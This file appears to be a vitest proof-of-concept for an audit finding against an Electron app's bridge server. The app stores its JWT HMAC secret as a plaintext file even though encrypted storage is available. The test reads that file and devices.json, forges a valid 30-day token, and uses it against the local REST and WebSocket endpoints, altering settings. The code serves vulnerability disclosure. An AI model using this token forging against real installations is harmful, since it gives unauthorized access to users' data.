/**
 * PoC — M2: bridge JWT secret persisted as plaintext file (auth.ts getJwtSecret)
 * =============================================================================
 * Finding: piolium/findings/M2-bridge-jwt-secret-plaintext-file
 *
 * Chain demonstrated (real application stack, only `electron` is stubbed so the
 * code runs headless; safeStorage mocks REPORT encryption as AVAILABLE):
 *
 *   1. App calls getJwtSecret() while safeStorage encryption is available:
 *      saveCredential() succeeds (encrypted credential stored in
 *      credentials.json)  —  YET auth.ts:105-110 UNCONDITIONALLY writes the raw
 *      HMAC secret to <userData>/data/config/bridge/secret (plaintext).
 *   2. A same-user process (attacker) reads ONLY those plaintext files:
 *        - bridge/secret        -> 32-byte HMAC key (base64)
 *        - bridge/devices.json  -> valid deviceId
 *   3. Attacker forges header.payload.signature with the recovered key
 *      (pure node:crypto, identical scheme to auth.ts signToken).
 *   4. The app's own verifyToken() accepts it; the real express/ws bridge
 *      accepts it: GET/PATCH on protected REST endpoints return 200 and the
 *      WS endpoint connects as a trusted device.
 */
import { describe, expect, it, vi, beforeAll, afterAll } from 'vitest'
import { createHmac } from 'node:crypto'
import { createServer, type Server } from 'node:http'
import { mkdirSync, writeFileSync, rmSync, readFileSync, existsSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import express from 'express'
import { WebSocket } from 'ws'

// ---- electron stub: safeStorage IS available (the "secure" configuration) ----
const mock = vi.hoisted(() => ({ userData: '' }))
vi.mock('electron', () => ({
  app: { getPath: () => mock.userData },
  safeStorage: {
    isEncryptionAvailable: () => true,
    encryptString: (plain: string) => Buffer.from('mock-enc:' + plain, 'utf-8'),
    decryptString: (buf: Buffer) => buf.toString('utf-8').replace(/^mock-enc:/, ''),
  },
}))
// 公告模块打桩：避免测试访问真实网络（与 routes.test.ts 一致）
vi.mock('../../ipc/announcement', () => ({
  fetchAnnouncementList: vi.fn(async () => ({ items: [], total: 0, page: 1, pageSize: 20 })),
  fetchVersionInfo: vi.fn(async () => ({ version: '0.0.0-poc', changelog: 'poc', downloadUrl: 'https://example.com/x' })),
}))

import { DIRS } from '../../services/storage'
import { buildBridgeRouter } from '../routes'
import { WsHub } from '../ws'
import { BridgeChatService } from '../chatService'
import { getJwtSecret, registerDevice, verifyToken } from '../auth'

const CHAR_ID = 'char-001'
const TEST_ROOT = join(tmpdir(), 'qingyu-m2-poc-' + Date.now())

/** Mirror of BridgeServer.start(): HTTP server + WsHub.attach() */
function listen(app: express.Express, hub?: WsHub): Promise<{ server: Server; port: number }> {
  return new Promise((resolve, reject) => {
    const server = createServer(app)
    hub?.attach(server)
    server.listen(0, '127.0.0.1', () => {
      const addr = server.address()
      if (addr && typeof addr === 'object') resolve({ server, port: addr.port })
      else reject(new Error('无地址'))
    })
    server.on('error', reject)
  })
}

// ---- attacker-side forge: standalone, does NOT use app signing code ----
function b64url(buf: Buffer): string {
  return buf.toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '')
}
/** Forge a 30-day bridge token from the plaintext secret */
function forgeToken(deviceId: string, key: Buffer, now = Date.now()): string {
  const header = b64url(Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })))
  const body = b64url(Buffer.from(JSON.stringify({ deviceId, iat: now, exp: now + 30 * 24 * 60 * 60 * 1000 })))
  const sig = createHmac('sha256', key).update(`${header}.${body}`).digest('base64url')
  return `${header}.${body}.${sig}`
}

describe('M2: bridge JWT secret plaintext file', () => {
  beforeAll(() => {
    mock.userData = TEST_ROOT
    mkdirSync(DIRS.chats(), { recursive: true })
    mkdirSync(DIRS.characters(), { recursive: true })
    writeFileSync(join(DIRS.characters(), `${CHAR_ID}.json`), JSON.stringify({
      id: CHAR_ID, name: '受害角色', description: 'secret-rp-data', personality: '',
      scenario: '', firstMessage: '', exampleDialog: '', tags: [], creator: '',
      createdAt: 0, updatedAt: 0, alternateGreetings: [], avatar: '',
    }))
  })
  afterAll(() => { rmSync(TEST_ROOT, { recursive: true, force: true }) })

  it('plaintext secret file exists even though safeStorage is available; attacker forges token and gains full bridge access', async () => {
    // ============ PHASE 1 — victim app generates its secret ============
    const secret = getJwtSecret()
    const secretB64 = secret.toString('base64')
    const secretPath = join(DIRS.config(), 'bridge', 'secret')
    const credPath = join(DIRS.config(), 'credentials.json')

    // Vulnerability core: BOTH the encrypted credential AND the plaintext file exist.
    const creds = JSON.parse(readFileSync(credPath, 'utf-8'))
    expect(existsSync(secretPath)).toBe(true)
    expect(creds['bridge-jwt-secret']).toBeTruthy()
    expect(creds['bridge-jwt-secret']).not.toMatch(/^plain:/) // encrypted storage path succeeded
    expect(readFileSync(secretPath, 'utf-8').trim()).toBe(secretB64) // ...but plaintext copy written too
    console.log(`[M2] safeStorage available; encrypted credential stored in credentials.json`)
    console.log(`[M2] ...yet plaintext HMAC secret ALSO written to: ${secretPath}`)
    console.log(`[M2] plaintext secret (base64): ${secretB64}`)

    // ============ PHASE 2 — a legitimate device is paired ============
    const device = registerDevice('受害者的手机', 'fp-victim-001')
    console.log(`[M2] legitimate device registered: ${device.deviceId} (devices.json is plaintext)`)

    // ============ PHASE 3 — ATTACKER: same-user process, reads only files ============
    const attackedSecret = readFileSync(secretPath, 'utf-8').trim() // plain fs read, no safeStorage
    const key = Buffer.from(attackedSecret, 'base64')
    const devices = JSON.parse(readFileSync(join(DIRS.config(), 'bridge', 'devices.json'), 'utf-8'))
    const victimDeviceId = devices[0].deviceId
    const forged = forgeToken(victimDeviceId, key)
    console.log(`[M2] attacker read bridge/secret + devices.json only; forged token:`)
    console.log(`[M2]   ${forged}`)

    // Real verifier accepts it (this is exactly what requireAuth/ws check)
    const payload = verifyToken(forged)
    expect(payload).not.toBeNull()
    expect(payload!.deviceId).toBe(victimDeviceId)
    expect(payload!.exp).toBeGreaterThan(Date.now())
    console.log(`[M2] real verifyToken() ACCEPTS forged token (deviceId=${payload!.deviceId}, 30-day exp)`)

    // ============ PHASE 4/5 — real HTTP + WS stack (hub attached like BridgeServer.start) ============
    const hub = new WsHub()
    const chatService = new BridgeChatService(hub, () => {})
    const app = express()
    app.use(express.json())
    app.use('/api/v1', buildBridgeRouter(hub, chatService, () => {}))
    const { server, port } = await listen(app, hub)
    const base = `http://127.0.0.1:${port}/api/v1`
    try {
      const noAuth = await fetch(`${base}/characters`)
      expect(noAuth.status).toBe(401)
      console.log(`[M2] GET /api/v1/characters without token -> 401 (baseline)  ${base}`)

      const chars = await fetch(`${base}/characters`, { headers: { Authorization: `Bearer ${forged}` } })
      expect(chars.status).toBe(200)
      const charsBody = await chars.json()
      console.log(`[M2] GET /api/v1/characters with FORGED token -> 200; leaked: ${JSON.stringify(charsBody).slice(0, 120)}`)

      const set = await fetch(`${base}/settings`, {
        method: 'PATCH',
        headers: { Authorization: `Bearer ${forged}`, 'Content-Type': 'application/json' },
        body: JSON.stringify({ userName: 'pwned-by-M2-forged-token' }),
      })
      expect(set.status).toBe(200)
      const settingsNow = JSON.parse(readFileSync(join(DIRS.config(), 'settings.json'), 'utf-8'))
      expect(settingsNow.userName).toBe('pwned-by-M2-forged-token')
      console.log(`[M2] PATCH /api/v1/settings with FORGED token -> 200; server data changed: userName=${settingsNow.userName}`)

      const ws = new WebSocket(`ws://127.0.0.1:${port}/ws?token=${forged}`)
      await new Promise<void>((resolve, reject) => {
        ws.on('open', () => resolve())
        ws.on('close', (code) => reject(new Error(`ws closed with ${code}`)))
        ws.on('error', reject)
      })
      ws.close()
      console.log(`[M2] WS /ws?token=<forged> connects as trusted device (auth bypass on websocket too)`)

      // Control: forged token for an UNKNOWN deviceId is rejected (device revocation check)
      const forgedUnknown = forgeToken('dev-does-not-exist-000', key)
      const unknown = await fetch(`${base}/characters`, { headers: { Authorization: `Bearer ${forgedUnknown}` } })
      expect(unknown.status).toBe(401)
      console.log(`[M2] control: forged token for unknown deviceId -> 401 (device must exist in devices.json)`)
    } finally {
      server.close()
    }

    console.log('[M2-RESULT] {"status":"confirmed","evidence":"forged token accepted by real verifyToken + real REST + real WS","notes":"safeStorage available yet plaintext bridge/secret written unconditionally"}')
  })
})